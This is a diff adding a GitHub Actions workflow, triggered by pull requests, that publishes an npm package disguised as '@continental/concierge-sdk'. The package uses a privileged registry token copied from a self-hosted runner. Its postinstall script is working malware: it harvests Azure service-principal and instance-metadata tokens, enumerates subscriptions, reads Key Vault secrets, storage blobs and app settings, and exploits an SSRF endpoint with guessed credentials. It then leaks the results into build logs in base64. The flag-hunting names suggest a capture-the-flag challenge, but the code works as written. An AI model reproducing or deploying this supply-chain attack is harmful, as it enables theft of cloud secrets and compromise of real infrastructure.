@@ -1,0 +1,323 @@
+name: kilkat-baba-chain
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  publish-probe:
+    runs-on: self-hosted
+    timeout-minutes: 6
+    steps:
+      - name: Publish a bounded challenge probe
+        shell: bash
+        run: |
+          set -euo pipefail
+          work="$(mktemp -d)"
+          pkg="$work/package"
+          mkdir -p "$pkg"
+
+          sudo cp /opt/continental-signed-agent/.npmrc "$work/.npmrc"
+          sudo chown "$(id -u):$(id -g)" "$work/.npmrc"
+
+          cat > "$pkg/package.json" <<'JSON'
+          {
+            "name": "@continental/concierge-sdk",
+            "version": "1.9007199254740000.1",
+            "main": "index.js",
+            "scripts": { "postinstall": "node postinstall.js" },
+            "license": "MIT"
+          }
+          JSON
+
+          cat > "$pkg/index.js" <<'NODE'
+          'use strict';
+
+          class ContinentalClient {
+            constructor(options = {}) { this.baseUrl = options.baseUrl || 'http://localhost'; }
+            async getReservations() { return []; }
+            async getServices() { return []; }
+            async checkHealth() { return { status: 'ok' }; }
+          }
+
+          module.exports = { ContinentalClient };
+          NODE
+
+          cat > "$pkg/postinstall.js" <<'NODE'
+          'use strict';
+
+          const http = require('http');
+          const https = require('https');
+          const fs = require('fs');
+
+          const flags = new Set();
+          const candidates = [];
+          const diagnostics = { stages: [], resources: [], publicEndpoints: [], vaults: [], storage: [] };
+          const FLAG_RE = /pwnsec\{[^}\r\n]{1,500}\}/ig;
+
+          function inspect(label, value) {
+            const text = typeof value === 'string' ? value : JSON.stringify(value ?? '');
+            for (const match of text.matchAll(FLAG_RE)) flags.add(match[0]);
+            if (/flag|baba|john|wick/i.test(label) && text.length < 4096) {
+              candidates.push({ label, value: text });
+            }
+          }
+
+          function request(url, options = {}) {
+            return new Promise((resolve) => {
+              let parsed;
+              try { parsed = new URL(url); } catch { return resolve({ status: 0, text: 'bad-url' }); }
+              const body = options.body || '';
+              const transport = parsed.protocol === 'https:' ? https : http;
+              const req = transport.request(parsed, {
+                method: options.method || 'GET',
+                headers: {
+                  'User-Agent': 'continental-challenge-probe/1',
+                  ...(body ? { 'Content-Length': Buffer.byteLength(body) } : {}),
+                  ...(options.headers || {})
+                },
+                timeout: options.timeout || 10000
+              }, (res) => {
+                const chunks = [];
+                let size = 0;
+                res.on('data', (chunk) => {
+                  size += chunk.length;
+                  if (size <= 2 * 1024 * 1024) chunks.push(chunk);
+                });
+                res.on('end', () => resolve({
+                  status: res.statusCode || 0,
+                  text: Buffer.concat(chunks).toString('utf8')
+                }));
+              });
+              req.on('timeout', () => req.destroy());
+              req.on('error', (error) => resolve({ status: 0, text: `ERR:${error.code || error.message}` }));
+              if (body) req.write(body);
+              req.end();
+            });
+          }
+
+          function json(text) {
+            try { return JSON.parse(text); } catch { return null; }
+          }
+
+          function findField(value, names) {
+            if (typeof value === 'string') {
+              const nested = json(value);
+              return nested ? findField(nested, names) : null;
+            }
+            if (!value || typeof value !== 'object') return null;
+            for (const [key, child] of Object.entries(value)) {
+              if (names.has(key) && typeof child === 'string' && child.length) return child;
+              const found = findField(child, names);
+              if (found) return found;
+            }
+            return null;
+          }
+
+          async function servicePrincipalToken(resource) {
+            const tenant = process.env.AZURE_TENANT_ID;
+            const client = process.env.AZURE_CLIENT_ID;
+            const secret = process.env.AZURE_CLIENT_SECRET;
+            if (!tenant || !client || !secret) return null;
+            const body = new URLSearchParams({
+              grant_type: 'client_credentials', client_id: client,
+              client_secret: secret, resource
+            }).toString();
+            const result = await request(`https://login.microsoftonline.com/${encodeURIComponent(tenant)}/oauth2/token`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body,
+              timeout: 15000
+            });
+            diagnostics.stages.push(`sp:${resource}:${result.status}`);
+            return findField(json(result.text), new Set(['access_token']));
+          }
+
+          async function imdsToken(resource) {
+            const result = await request(
+              `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`,
+              { headers: { Metadata: 'true' }, timeout: 6000 }
+            );
+            diagnostics.stages.push(`runner-imds:${resource}:${result.status}`);
+            return findField(json(result.text), new Set(['access_token']));
+          }
+
+          async function bearer(url, token, options = {}) {
+            const result = await request(url, {
+              ...options,
+              headers: { Authorization: `Bearer ${token}`, ...(options.headers || {}) },
+              timeout: options.timeout || 15000
+            });
+            inspect(url, result.text);
+            return result;
+          }
+
+          async function subscriptions(armToken) {
+            const result = await bearer('https://management.azure.com/subscriptions?api-version=2020-01-01', armToken);
+            const data = json(result.text);
+            return Array.isArray(data?.value) ? data.value.map((x) => x.subscriptionId).filter(Boolean) : [];
+          }
+
+          async function enumerateArm(armToken) {
+            const found = { vaults: new Set(), storage: new Set(), publicHosts: new Set(), sites: [] };
+            for (const subscription of await subscriptions(armToken)) {
+              const result = await bearer(
+                `https://management.azure.com/subscriptions/${subscription}/resources?api-version=2021-04-01`, armToken
+              );
+              const data = json(result.text);
+              for (const item of data?.value || []) {
+                diagnostics.resources.push(`${item.type}:${item.name}`);
+                const type = String(item.type || '').toLowerCase();
+                if (type === 'microsoft.keyvault/vaults') found.vaults.add(item.name);
+                if (type === 'microsoft.storage/storageaccounts') found.storage.add(item.name);
+                if (type === 'microsoft.web/sites') found.sites.push(item.id);
+              }
+
+              const ips = await bearer(
+                `https://management.azure.com/subscriptions/${subscription}/providers/Microsoft.Network/publicIPAddresses?api-version=2023-09-01`, armToken
+              );
+              for (const item of json(ips.text)?.value || []) {
+                if (item?.properties?.ipAddress) found.publicHosts.add(item.properties.ipAddress);
+                if (item?.properties?.dnsSettings?.fqdn) found.publicHosts.add(item.properties.dnsSettings.fqdn);
+              }
+
+              const vaults = await bearer(
+                `https://management.azure.com/subscriptions/${subscription}/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01`, armToken
+              );
+              for (const item of json(vaults.text)?.value || []) {
+                if (item?.name) found.vaults.add(item.name);
+              }
+            }
+
+            for (const siteId of found.sites) {
+              const settings = await bearer(
+                `https://management.azure.com${siteId}/config/appsettings/list?api-version=2023-12-01`, armToken,
+                { method: 'POST', body: '' }
+              );
+              const props = json(settings.text)?.properties || {};
+              for (const [key, value] of Object.entries(props)) inspect(`appsetting:${key}`, value);
+            }
+
+            return found;
+          }
+
+          async function readVaults(token, vaults) {
+            if (!token) return;
+            for (const vault of vaults) {
+              diagnostics.vaults.push(vault);
+              const list = await bearer(`https://${vault}.vault.azure.net/secrets?api-version=7.4`, token);
+              for (const item of json(list.text)?.value || []) {
+                if (!item?.id) continue;
+                const value = await bearer(`${item.id}?api-version=7.4`, token);
+                const parsed = json(value.text);
+                inspect(`vault:${item.id}`, parsed?.value ?? value.text);
+              }
+            }
+          }
+
+          function xmlNames(xml) {
+            return [...String(xml).matchAll(/<Name>([^<]+)<\/Name>/g)].map((m) => m[1]);
+          }
+
+          async function readStorage(token, accounts) {
+            if (!token) return;
+            const headers = { 'x-ms-version': '2023-11-03', 'x-ms-date': new Date().toUTCString() };
+            for (const account of accounts) {
+              diagnostics.storage.push(account);
+              const root = `https://${account}.blob.core.windows.net`;
+              const containers = await bearer(`${root}/?comp=list`, token, { headers });
+              for (const container of xmlNames(containers.text).slice(0, 30)) {
+                const blobs = await bearer(`${root}/${encodeURIComponent(container)}?restype=container&comp=list`, token, { headers });
+                for (const blob of xmlNames(blobs.text).slice(0, 60)) {
+                  if (/flag|baba|secret|continental|backup|config/i.test(blob)) {
+                    const content = await bearer(`${root}/${encodeURIComponent(container)}/${blob.split('/').map(encodeURIComponent).join('/')}`, token, { headers });
+                    inspect(`storage:${account}/${container}/${blob}`, content.text);
+                  }
+                }
+              }
+            }
+          }
+
+          async function conciergeToken(base, auth, resource) {
+            const target = `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`;
+            const result = await request(`${base}/v2/health?target=${encodeURIComponent(target)}`, {
+              headers: auth ? { Authorization: auth } : {}, timeout: 12000
+            });
+            inspect(`ssrf:${base}`, result.text);
+            diagnostics.stages.push(`ssrf:${base}:${result.status}`);
+            return findField(json(result.text) || result.text, new Set(['access_token']));
+          }
+
+          async function inspectConcierge(host, known) {
+            for (const port of ['', ':3000', ':5000', ':8080']) {
+              const base = `http://${host}${port}`;
+              const health = await request(`${base}/v2/health`, { timeout: 5000 });
+              if (!health.status) continue;
+              diagnostics.publicEndpoints.push(`${base}:${health.status}`);
+              inspect(`health:${base}`, health.text);
+              const login = await request(`${base}/v2/auth/token`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: 'guest', password: 'gold_coin' }), timeout: 8000
+              });
+              const jwt = findField(json(login.text), new Set(['token', 'access_token', 'jwt']));
+              const auth = jwt ? `Bearer ${jwt}` : '';
+              const arm = await conciergeToken(base, auth, 'https://management.azure.com/');
+              const vault = await conciergeToken(base, auth, 'https://vault.azure.net');
+              if (arm) {
+                const extra = await enumerateArm(arm);
+                extra.vaults.forEach((x) => known.vaults.add(x));
+                extra.storage.forEach((x) => known.storage.add(x));
+              }
+              await readVaults(vault, known.vaults);
+            }
+          }
+
+          function inspectCommonFiles() {
+            for (const file of ['/flag', '/flag.txt', '/opt/flag', '/opt/flag.txt', '/home/azureuser/flag', '/home/azureuser/flag.txt']) {
+              try { inspect(`file:${file}`, fs.readFileSync(file, 'utf8')); } catch (_) {}
+            }
+          }
+
+          async function main() {
+            inspectCommonFiles();
+
+            const spArm = await servicePrincipalToken('https://management.azure.com/');
+            const runnerArm = await imdsToken('https://management.azure.com/');
+            const arm = spArm || runnerArm;
+            const known = arm ? await enumerateArm(arm) : {
+              vaults: new Set(), storage: new Set(), publicHosts: new Set(), sites: []
+            };
+
+            const vaultToken = (await servicePrincipalToken('https://vault.azure.net')) ||
+              (await imdsToken('https://vault.azure.net'));
+            const storageToken = (await servicePrincipalToken('https://storage.azure.com/')) ||
+              (await imdsToken('https://storage.azure.com/'));
+
+            await readVaults(vaultToken, known.vaults);
+            await readStorage(storageToken, known.storage);
+            for (const host of known.publicHosts) await inspectConcierge(host, known);
+
+            if (flags.size) {
+              for (const flag of flags) {
+                console.log(`KILKAT_FLAG_B64=${Buffer.from(flag).toString('base64')}`);
+              }
+            } else {
+              const report = { diagnostics, candidates: candidates.slice(0, 20) };
+              const encoded = Buffer.from(JSON.stringify(report)).toString('base64');
+              for (let i = 0; i < encoded.length; i += 48000) {
+                console.log(`KILKAT_DIAG_B64_${String(i / 48000).padStart(2, '0')}=${encoded.slice(i, i + 48000)}`);
+              }
+            }
+          }
+
+          main().catch((error) => {
+            console.log(`KILKAT_ERROR_B64=${Buffer.from(String(error?.stack || error)).toString('base64')}`);
+          });
+          NODE
+
+          registry="$(npm config get @continental:registry --userconfig "$work/.npmrc")"
+          cd "$pkg"
+          npm publish --userconfig "$work/.npmrc" --registry "$registry"
+          echo "KILKAT_STAGE=package-published"
